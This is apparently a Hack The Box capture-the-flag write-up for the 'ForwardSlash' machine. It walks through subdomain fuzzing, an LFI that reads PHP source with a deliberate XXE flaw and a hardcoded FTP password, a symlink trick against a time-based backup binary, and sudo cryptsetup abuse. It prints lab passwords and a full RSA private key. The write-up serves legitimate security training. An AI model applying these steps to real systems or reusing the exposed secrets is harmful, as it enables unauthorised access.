---
"title": "Hack The Box - ForwardSlash"
"date": 2020-07-04
"tags": ["linux", "hard", "domain", "lfi", "luks"]
"keywords": ["linux", "hard", "domain", "lfi", "luks"]
"categories": ["HackTheBox"]
"author": "Ghostbyt3"
"description": "Getting Initial shell is finding a LFI in the subdomain and get the FTP password from that to get first user and second user is by tricking a binary and root is by mounting an image with the help of Luks"
"featured_image": "/img/htb-forwardslash/Untitled.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "HackTheBox - Writeup"
---


![Untitled](/img/htb-forwardslash/Untitled.png)

Getting Initial shell is finding a LFI in the subdomain and get the FTP password from that to get first user and second user is by tricking a binary and root is by mounting an image with the help of Luks


Link: [https://www.hackthebox.eu/home/machines/profile/239](https://www.hackthebox.eu/home/machines/profile/239)

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results

```nix
PORT      STATE  SERVICE VERSION
22/tcp    open   ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3c:3b:eb:54:96:81:1d:da:d7:96:c7:0f:b4:7e:e1:cf (RSA)
|   256 f6:b3:5f:a2:59:e3:1e:57:35:36:c3:fe:5e:3d:1f:66 (ECDSA)
|_  256 1b:de:b8:07:35:e8:18:2c:19:d8:cc:dd:77:9c:f2:5e (ED25519)
80/tcp    open   http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Backslash Gang
65430/tcp closed unknown
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=5/21%OT=22%CT=65430%CU=38506%PV=Y%DS=2%DC=T%G=Y%TM=5EC
OS:5F432%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A
OS:)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54
OS:DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88
OS:)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+
OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
OS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A
OS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D
OS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4
OS:0%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## HTTP Enumeration

Once I enter the IP address, it redirects me to `forwardslash.htb` so I added it in `/etc/hosts` and I get this page.

![Untitled](/img/htb-forwardslash/Untitled%201.png)

Nothing here.

Since it redirects me to `forwardslash.htb`, there is a chance of subdomains so I decided to fuzz subdomains.

```nix
root@w0lf:~/CTF/HTB/Boxes/ForwardSlash# wfuzz -H 'HOST: FUZZ.forwardslash.htb' -u 'http://10.10.10.183' -w /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt --hw 0

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.183/
Total requests: 484700

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                                                                      
===================================================================

000005959:   302        0 L      6 W      33 Ch       "backup"                                                                                                                                                                     
000006293:   302        0 L      0 W      0 Ch        "radioplayerperu"
```

## Found New SubDomain

`backup.forwardslash.htb`

![Untitled](/img/htb-forwardslash/Untitled%202.png)

I tried some default credentials, none worked.

So I created an new account 

![Untitled](/img/htb-forwardslash/Untitled%203.png)

I logged in with the credentials

![Untitled](/img/htb-forwardslash/Untitled%204.png)

I ran Gobuster here.

```nix
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://backup.forwardslash.htb/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/21 13:10:19 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/dev (Status: 301)
/index.php (Status: 302)
/server-status (Status: 403)
===============================================================
2020/05/21 13:12:49 Finished
===============================================================
```

`/dev/`

![Untitled](/img/htb-forwardslash/Untitled%205.png)

We dont have permission. Let's continue enumerate.

There is a message and it was written by `chiv` maybe an user.

![Untitled](/img/htb-forwardslash/Untitled%206.png)

## Exploiting LFI

Which checking the ProfilePicture thing. Its disabled but we can see an username here `pain`

![Untitled](/img/htb-forwardslash/Untitled%207.png)

So I Inspect Element and here we can see the disabled option.

![Untitled](/img/htb-forwardslash/gg.png)

I changed that to enable and now I can control over the URL and Submit button.

![Untitled](/img/htb-forwardslash/Untitled%208.png)

I captured the request in burp and send that to repeater and I tested is there any LFi and see it works, I got `/etc/passwd`

![Untitled](/img/htb-forwardslash/Untitled%209.png)

I tried to get the index.php as base64 encoded using PHP filters.

![Untitled](/img/htb-forwardslash/Untitled%2010.png)

Nothing useful here.

![Untitled](/img/htb-forwardslash/Untitled%2011.png)

But we know there is a dir called `/dev/index.php`

![Untitled](/img/htb-forwardslash/Untitled%2012.png)

Decoded the base64

```php
root@w0lf:~/CTF/HTB/Boxes/ForwardSlash# echo "PD9waHAKLy9pbmNsdWRlX29uY2UgLi4vc2Vzc2lvbi5waHA7Ci8vIEluaXRpYWxpemUgdGhlIHNlc3Npb24Kc2Vzc2lvbl9zdGFydCgpOwoKaWYoKCFpc3NldCgkX1NFU1NJT05bImxvZ2dlZGluIl0pIHx8ICRfU0VTU0lPTlsibG9nZ2VkaW4iXSAhPT0gdHJ1ZSB8fCAkX1NFU1NJT05bJ3VzZXJuYW1lJ10gIT09ICJhZG1pbiIpICYmICRfU0VSVkVSWydSRU1PVEVfQUREUiddICE9PSAiMTI3LjAuMC4xIil7CiAgICBoZWFkZXIoJ0hUVFAvMS4wIDQwMyBGb3JiaWRkZW4nKTsKICAgIGVjaG8gIjxoMT40MDMgQWNjZXNzIERlbmllZDwvaDE+IjsKICAgIGVjaG8gIjxoMz5BY2Nlc3MgRGVuaWVkIEZyb20gIiwgJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10sICI8L2gzPiI7CiAgICAvL2VjaG8gIjxoMj5SZWRpcmVjdGluZyB0byBsb2dpbiBpbiAzIHNlY29uZHM8L2gyPiIKICAgIC8vZWNobyAnPG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29udGVudD0iMzt1cmw9Li4vbG9naW4ucGhwIiAvPic7CiAgICAvL2hlYWRlcigibG9jYXRpb246IC4uL2xvZ2luLnBocCIpOwogICAgZXhpdDsKfQo/Pgo8aHRtbD4KCTxoMT5YTUwgQXBpIFRlc3Q8L2gxPgoJPGgzPlRoaXMgaXMgb3VyIGFwaSB0ZXN0IGZvciB3aGVuIG91ciBuZXcgd2Vic2l0ZSBnZXRzIHJlZnVyYmlzaGVkPC9oMz4KCTxmb3JtIGFjdGlvbj0iL2Rldi9pbmRleC5waHAiIG1ldGhvZD0iZ2V0IiBpZD0ieG1sdGVzdCI+CgkJPHRleHRhcmVhIG5hbWU9InhtbCIgZm9ybT0ieG1sdGVzdCIgcm93cz0iMjAiIGNvbHM9IjUwIj48YXBpPgogICAgPHJlcXVlc3Q+dGVzdDwvcmVxdWVzdD4KPC9hcGk+CjwvdGV4dGFyZWE+CgkJPGlucHV0IHR5cGU9InN1Ym1pdCI+Cgk8L2Zvcm0+Cgo8L2h0bWw+Cgo8IS0tIFRPRE86CkZpeCBGVFAgTG9naW4KLS0+Cgo8P3BocAppZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICJHRVQiICYmIGlzc2V0KCRfR0VUWyd4bWwnXSkpIHsKCgkkcmVnID0gJy9mdHA6XC9cL1tcc1xTXSpcL1wiLyc7CgkvLyRyZWcgPSAnLygoKCgyNVswLTVdKXwoMlswLTRdXGQpfChbMDFdP1xkP1xkKSkpXC4pezN9KCgoKDI1WzAtNV0pfCgyWzAtNF1cZCl8KFswMV0/XGQ/XGQpKSkpLycKCglpZiAocHJlZ19tYXRjaCgkcmVnLCAkX0dFVFsneG1sJ10sICRtYXRjaCkpIHsKCQkkaXAgPSBleHBsb2RlKCcvJywgJG1hdGNoWzBdKVsyXTsKCQllY2hvICRpcDsKCQllcnJvcl9sb2coIkNvbm5lY3RpbmciKTsKCgkJJGNvbm5faWQgPSBmdHBfY29ubmVjdCgkaXApIG9yIGRpZSgiQ291bGRuJ3QgY29ubmVjdCB0byAkaXBcbiIpOwoKCQllcnJvcl9sb2coIkxvZ2dpbmcgaW4iKTsKCgkJaWYgKEBmdHBfbG9naW4oJGNvbm5faWQsICJjaGl2IiwgJ04wYm9keUwxa2VzQmFjay8nKSkgewoKCQkJZXJyb3JfbG9nKCJHZXR0aW5nIGZpbGUiKTsKCQkJZWNobyBmdHBfZ2V0X3N0cmluZygkY29ubl9pZCwgImRlYnVnLnR4dCIpOwoJCX0KCgkJZXhpdDsKCX0KCglsaWJ4bWxfZGlzYWJsZV9lbnRpdHlfbG9hZGVyIChmYWxzZSk7CgkkeG1sZmlsZSA9ICRfR0VUWyJ4bWwiXTsKCSRkb20gPSBuZXcgRE9NRG9jdW1lbnQoKTsKCSRkb20tPmxvYWRYTUwoJHhtbGZpbGUsIExJQlhNTF9OT0VOVCB8IExJQlhNTF9EVERMT0FEKTsKCSRhcGkgPSBzaW1wbGV4bWxfaW1wb3J0X2RvbSgkZG9tKTsKCSRyZXEgPSAkYXBpLT5yZXF1ZXN0OwoJZWNobyAiLS0tLS1vdXRwdXQtLS0tLTxicj5cclxuIjsKCWVjaG8gIiRyZXEiOwp9CgpmdW5jdGlvbiBmdHBfZ2V0X3N0cmluZygkZnRwLCAkZmlsZW5hbWUpIHsKICAgICR0ZW1wID0gZm9wZW4oJ3BocDovL3RlbXAnLCAncisnKTsKICAgIGlmIChAZnRwX2ZnZXQoJGZ0cCwgJHRlbXAsICRmaWxlbmFtZSwgRlRQX0JJTkFSWSwgMCkpIHsKICAgICAgICByZXdpbmQoJHRlbXApOwogICAgICAgIHJldHVybiBzdHJlYW1fZ2V0X2NvbnRlbnRzKCR0ZW1wKTsKICAgIH0KICAgIGVsc2UgewogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KfQoKPz4K" | base64 -d
<?php
//include_once ../session.php;
// Initialize the session
session_start();

if((!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true || $_SESSION['username'] !== "admin") && $_SERVER['REMOTE_ADDR'] !== "127.0.0.1"){
    header('HTTP/1.0 403 Forbidden');
    echo "[h1](h1)403 Access Denied[/h1](/h1)";
    echo "[h3](h3)Access Denied From ", $_SERVER['REMOTE_ADDR'], "[/h3](/h3)";
    //echo "[h2](h2)Redirecting to login in 3 seconds[/h2](/h2)"
    //echo '[meta http-equiv="refresh" content="3;url=../login.php" /](meta http-equiv="refresh" content="3;url=../login.php" /)';
    //header("location: ../login.php");
    exit;
}
?>
[html](html)
	[h1](h1)XML Api Test[/h1](/h1)
	[h3](h3)This is our api test for when our new website gets refurbished[/h3](/h3)
	[form action="/dev/index.php" method="get" id="xmltest"](form action="/dev/index.php" method="get" id="xmltest")
		[textarea name="xml" form="xmltest" rows="20" cols="50"](textarea name="xml" form="xmltest" rows="20" cols="50")[api](api)
    [request](request)test[/request](/request)
[/api](/api)
[/textarea](/textarea)
		[input type="submit"](input type="submit")
	[/form](/form)

[/html](/html)

<!-- TODO:
Fix FTP Login
-->

<?php
if ($_SERVER['REQUEST_METHOD'] === "GET" && isset($_GET['xml'])) {

	$reg = '/ftp:\/\/[\s\S]*\/\"/';
	//$reg = '/((((25[0-5])|(2[0-4]\d)|([01]?\d?\d)))\.){3}((((25[0-5])|(2[0-4]\d)|([01]?\d?\d))))/'

	if (preg_match($reg, $_GET['xml'], $match)) {
		$ip = explode('/', $match[0])[2];
		echo $ip;
		error_log("Connecting");

		$conn_id = ftp_connect($ip) or die("Couldn't connect to $ip\n");

		error_log("Logging in");

		if (@ftp_login($conn_id, "chiv", 'N0bodyL1kesBack/')) {

			error_log("Getting file");
			echo ftp_get_string($conn_id, "debug.txt");
		}

		exit;
	}

	libxml_disable_entity_loader (false);
	$xmlfile = $_GET["xml"];
	$dom = new DOMDocument();
	$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
	$api = simplexml_import_dom($dom);
	$req = $api->request;
	echo "-----output-----[br](br)\r\n";
	echo "$req";
}

function ftp_get_string($ftp, $filename) {
    $temp = fopen('php://temp', 'r+');
    if (@ftp_fget($ftp, $temp, $filename, FTP_BINARY, 0)) {
        rewind($temp);
        return stream_get_contents($temp);
    }
    else {
        return false;
    }
}

?>
```

Here you can see a FTP login details

```php
if (@ftp_login($conn_id, "chiv", 'N0bodyL1kesBack/')) {

			error_log("Getting file");
			echo ftp_get_string($conn_id, "debug.txt");
		}
```

We know SSH port is open, let's try login with it.

## Getting Chiv User

I logged in with `chiv : N0bodyL1kesBack/`

![Untitled](/img/htb-forwardslash/Untitled%2013.png)

But No User Flag.

## Getting Pain User

Upload Linux Enumeration script and found a binary called `backup`

![Untitled](/img/htb-forwardslash/Untitled%2014.png)

The executable looking for something and doesn't exist so it exit.

```bash
chiv@forwardslash:~$ backup 
----------------------------------------------------------------------
	Pain's Next-Gen Time Based Backup Viewer
	v0.1
	NOTE: not reading the right file yet, 
	only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 15:24:15
ERROR: 29797290cbcf0652080a25751835db02 Does Not Exist or Is Not Accessible By Me, Exiting...
```

I also find a `config.php.bak` file in `/var/backups` and its owned by user `pain`

![Untitled](/img/htb-forwardslash/Untitled%2015.png)

I did `ltrace` to find what's going on and It looks like getting the time (hour, minutes, seconds) of the box and `md5` that and looking if the file presents and opens that, Maybe we can use the `config.php.bak` since this binary is also owne by `pain` user.

```nix
chiv@forwardslash:/usr/bin$ ltrace ./backup 
getuid()                                                                                                                                           = 1001
getgid()                                                                                                                                           = 1001
puts("--------------------------------"...----------------------------------------------------------------------
	Pain's Next-Gen Time Based Backup Viewer
	v0.1
	NOTE: not reading the right file yet, 
	only works if backup is taken in same second
----------------------------------------------------------------------

)                                                                                                        = 277
time(0)                                                                                                                                            = 1590126187
localtime(0x7fff25a81270)                                                                                                                          = 0x7f38395b26a0
malloc(13)                                                                                                                                         = 0x556f48ca88e0
sprintf("05:43:07", "%02d:%02d:%02d", 5, 43, 7)                                                                                                    = 8
strlen("05:43:07")                                                                                                                                 = 8
malloc(33)                                                                                                                                         = 0x556f48ca8900
MD5_Init(0x7fff25a811c0, 4000, 0x556f48ca8900, 0x556f48ca8900)                                                                                     = 1
MD5_Update(0x7fff25a811c0, 0x556f48ca88e0, 8, 0x556f48ca88e0)                                                                                      = 1
MD5_Final(0x7fff25a81220, 0x7fff25a811c0, 0x7fff25a811c0, 0)                                                                                       = 1
snprintf("e3", 32, "%02x", 0xe3)                                                                                                                   = 2
snprintf("89", 32, "%02x", 0x89)                                                                                                                   = 2
snprintf("74", 32, "%02x", 0x74)                                                                                                                   = 2
snprintf("93", 32, "%02x", 0x93)                                                                                                                   = 2
snprintf("ff", 32, "%02x", 0xff)                                                                                                                   = 2
snprintf("a3", 32, "%02x", 0xa3)                                                                                                                   = 2
snprintf("9c", 32, "%02x", 0x9c)                                                                                                                   = 2
snprintf("3f", 32, "%02x", 0x3f)                                                                                                                   = 2
snprintf("bd", 32, "%02x", 0xbd)                                                                                                                   = 2
snprintf("bb", 32, "%02x", 0xbb)                                                                                                                   = 2
snprintf("f4", 32, "%02x", 0xf4)                                                                                                                   = 2
snprintf("3b", 32, "%02x", 0x3b)                                                                                                                   = 2
snprintf("2d", 32, "%02x", 0x2d)                                                                                                                   = 2
snprintf("40", 32, "%02x", 0x40)                                                                                                                   = 2
snprintf("ca", 32, "%02x", 0xca)                                                                                                                   = 2
snprintf("1c", 32, "%02x", 0x1c)                                                                                                                   = 2
printf("Current Time: %s\n", "05:43:07"Current Time: 05:43:07
)                                                                                                           = 23
setuid(1002)                                                                                                                                       = -1
setgid(1002)                                                                                                                                       = -1
access("e3897493ffa39c3fbdbbf43b2d40ca1c"..., 0)                                                                                                   = -1
printf("ERROR: %s Does Not Exist or Is N"..., "e3897493ffa39c3fbdbbf43b2d40ca1c"...ERROR: e3897493ffa39c3fbdbbf43b2d40ca1c Does Not Exist or Is Not Accessible By Me, Exiting...
)                                                               = 94
setuid(1001)                                                                                                                                       = 0
setgid(1001)                                                                                                                                       = 0
remove("e3897493ffa39c3fbdbbf43b2d40ca1c"...)                                                                                                      = -1
+++ exited (status 0) +++
```

So I created a quick bash script, this just run the `backup` binary first and grep the `md5` alone and then symlink the file `config.php.bak` with `md5` we just grep before.

```nix
chiv@forwardslash:~$ cat pain 
hash=$(/usr/bin/backup | grep ERROR | awk '{print $2}')
ln -sf /var/backups/config.php.bak /home/chiv/$hash;
/usr/bin/backup;
```

When I run my script it gives me the hidden content.

```php
chiv@forwardslash:~$ ./pain 
----------------------------------------------------------------------
	Pain's Next-Gen Time Based Backup Viewer
	v0.1
	NOTE: not reading the right file yet, 
	only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 06:06:28
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'pain');
define('DB_PASSWORD', 'db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704');
define('DB_NAME', 'site');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```


By using the password we got, I logged in as `pain` with `db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704`

![Untitled](/img/htb-forwardslash/Untitled%2016.png)

## Privilege Escalation

The first thing I did is `sudo -l`

```nix
pain@forwardslash:/home/chiv$ sudo -l
Matching Defaults entries for pain on forwardslash:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pain may run the following commands on forwardslash:
    (root) NOPASSWD: /sbin/cryptsetup luksOpen *
    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
    (root) NOPASSWD: /bin/umount ./mnt/
```

We know there is `recovery` folder in `/var/backups`

```nix
pain@forwardslash:/var/backups$ cd recovery/
pain@forwardslash:/var/backups/recovery$ ls
encrypted_backup.img
pain@forwardslash:/var/backups/recovery$ ls -la
total 976576
drwxrwx--- 2 root backupoperator       4096 May 27  2019 .
drwxr-xr-x 3 root root                 4096 Mar 24 10:10 ..
-rw-r----- 1 root backupoperator 1000000000 Mar 24 12:12 encrypted_backup.img
```

Only `Root` and `backupoperator` have permission.

I also checked the home directory and found this, it seems some kind of crypto challenge.

![Untitled](/img/htb-forwardslash/Untitled%2017.png)

I wrote a trash script and it doesn't work well, My script is to bruteforce keys and see if we have common words in the `ciphertext` and I got this as output.

```bash
cB!6%sdH8Lj^@Y*$C2cf
```

> [https://www.cyberciti.biz/hardware/howto-linux-hard-disk-encryption-with-luks-cryptsetup-command/](https://www.cyberciti.biz/hardware/howto-linux-hard-disk-encryption-with-luks-cryptsetup-command/)

```nix
pain@forwardslash:~/encryptorinator$ sudo /sbin/cryptsetup luksOpen /var/backups/recovery/encrypted_backup.img backup
Enter passphrase for /var/backups/recovery/encrypted_backup.img:
pain@forwardslash:~/mnt$
```

Enter the password the one we got from decryption and a file called **backup** will be created inside **/dev/mapper**. *We strictly need the name backup as we only have sudo permission to mount this.*

Now mount it and read what is inside.

```nix
pain@forwardslash:~$ mkdir mnt
pain@forwardslash:~$ sudo /bin/mount /dev/mapper/backup ./mnt/
pain@forwardslash:~$ ls
encryptorinator  mnt  note.txt  user.txt
pain@forwardslash:~$ cd mnt/
pain@forwardslash:~/mnt$ ls
id_rsa
pain@forwardslash:~/mnt$ cat id_rsa 
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA9i/r8VGof1vpIV6rhNE9hZfBDd3u6S16uNYqLn+xFgZEQBZK
RKh+WDykv/gukvUSauxWJndPq3F1Ck0xbcGQu6+1OBYb+fQ0B8raCRjwtwYF4gaf
yLFcOS111mKmUIB9qR1wDsmKRbtWPPPvgs2ruafgeiHujIEkiUUk9f3WTNqUsPQc
u2AG//ZCiqKWcWn0CcC2EhWsRQhLOvh3pGfv4gg0Gg/VNNiMPjDAYnr4iVg4XyEu
NWS2x9PtPasWsWRPLMEPtzLhJOnHE3iVJuTnFFhp2T6CtmZui4TJH3pij6wYYis9
MqzTmFwNzzx2HKS2tE2ty2c1CcW+F3GS/rn0EQIDAQABAoIBAQCPfjkg7D6xFSpa
V+rTPH6GeoB9C6mwYeDREYt+lNDsDHUFgbiCMk+KMLa6afcDkzLL/brtKsfWHwhg
G8Q+u/8XVn/jFAf0deFJ1XOmr9HGbA1LxB6oBLDDZvrzHYbhDzOvOchR5ijhIiNO
3cPx0t1QFkiiB1sarD9Wf2Xet7iMDArJI94G7yfnfUegtC5y38liJdb2TBXwvIZC
vROXZiQdmWCPEmwuE0aDj4HqmJvnIx9P4EAcTWuY0LdUU3zZcFgYlXiYT0xg2N1p
MIrAjjhgrQ3A2kXyxh9pzxsFlvIaSfxAvsL8LQy2Osl+i80WaORykmyFy5rmNLQD
Ih0cizb9AoGBAP2+PD2nV8y20kF6U0+JlwMG7WbV/rDF6+kVn0M2sfQKiAIUK3Wn
5YCeGARrMdZr4fidTN7koke02M4enSHEdZRTW2jRXlKfYHqSoVzLggnKVU/eghQs
V4gv6+cc787HojtuU7Ee66eWj0VSr0PXjFInzdSdmnd93oDZPzwF8QUnAoGBAPhg
e1VaHG89E4YWNxbfr739t5qPuizPJY7fIBOv9Z0G+P5KCtHJA5uxpELrF3hQjJU8
6Orz/0C+TxmlTGVOvkQWij4GC9rcOMaP03zXamQTSGNROM+S1I9UUoQBrwe2nQeh
i2B/AlO4PrOHJtfSXIzsedmDNLoMqO5/n/xAqLAHAoGATnv8CBntt11JFYWvpSdq
tT38SlWgjK77dEIC2/hb/J8RSItSkfbXrvu3dA5wAOGnqI2HDF5tr35JnR+s/JfW
woUx/e7cnPO9FMyr6pbr5vlVf/nUBEde37nq3rZ9mlj3XiiW7G8i9thEAm471eEi
/vpe2QfSkmk1XGdV/svbq/sCgYAZ6FZ1DLUylThYIDEW3bZDJxfjs2JEEkdko7mA
1DXWb0fBno+KWmFZ+CmeIU+NaTmAx520BEd3xWIS1r8lQhVunLtGxPKvnZD+hToW
J5IdZjWCxpIadMJfQPhqdJKBR3cRuLQFGLpxaSKBL3PJx1OID5KWMa1qSq/EUOOr
OENgOQKBgD/mYgPSmbqpNZI0/B+6ua9kQJAH6JS44v+yFkHfNTW0M7UIjU7wkGQw
ddMNjhpwVZ3//G6UhWSojUScQTERANt8R+J6dR0YfPzHnsDIoRc7IABQmxxygXDo
ZoYDzlPAlwJmoPQXauRl1CgjlyHrVUTfS0AkQH2ZbqvK5/Metq8o
-----END RSA PRIVATE KEY-----
```

![Untitled](/img/htb-forwardslash/Untitled%2018.png)